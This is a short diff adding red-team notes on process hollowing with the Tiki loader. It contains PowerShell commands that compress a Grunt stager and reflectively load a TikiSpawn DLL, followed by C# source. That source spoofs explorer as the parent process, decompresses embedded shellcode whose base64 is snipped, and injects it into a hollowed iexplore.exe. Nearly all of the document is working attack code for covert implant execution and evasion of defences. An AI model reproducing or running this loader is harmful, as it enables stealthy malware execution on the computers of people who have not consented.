@@ -1,0 +1,54 @@
+Process Hollowing w/ Tiki
+PS C:\Users\Daniel> Get-CompressedShellcode -inFile D:\Tools\GruntStager.bin -outFile D:\Tools\TikiGruntStager.txt
+
+PS C:\Users\user1> $TikiSpawn = [System.IO.File]::ReadAllBytes("C:\Users\user1\Desktop\TikiSpawn.dll")
+PS C:\Users\user1> [System.Reflection.Assembly]::Load($TikiSpawn)
+
+GAC    Version        Location
+---    -------        --------
+False  v4.0.30319
+
+
+PS C:\Users\user1> [TikiSpawn]::Flame()
+
+
+
+using System;
+using System.Diagnostics;
+
+using TikiLoader;
+
+public class TikiSpawn
+{
+    private static int FindProcessPid(string process)
+    {
+        int pid = 0;
+        int session = Process.GetCurrentProcess().SessionId;
+        Process[] processes = Process.GetProcessesByName(process);
+
+        foreach (Process proc in processes)
+        {
+            if (proc.SessionId == session)
+                pid = proc.Id;
+        }
+
+        return pid;
+
+    }
+
+    public static void Flame()
+    {
+        string binary = @"C:\Program Files\Internet Explorer\iexplore.exe";
+        byte[] shellcode = Loader.DecompressShellcode(Convert.FromBase64String("H4sI[...snip...]nwAA"));
+        int ppid = FindProcessPid("explorer");
+
+        try
+        {
+            var ldr = new Loader();
+            ldr.Load(binary, shellcode, ppid);
+        }
+        catch {
+            // pokemon
+        }
+    }
+}
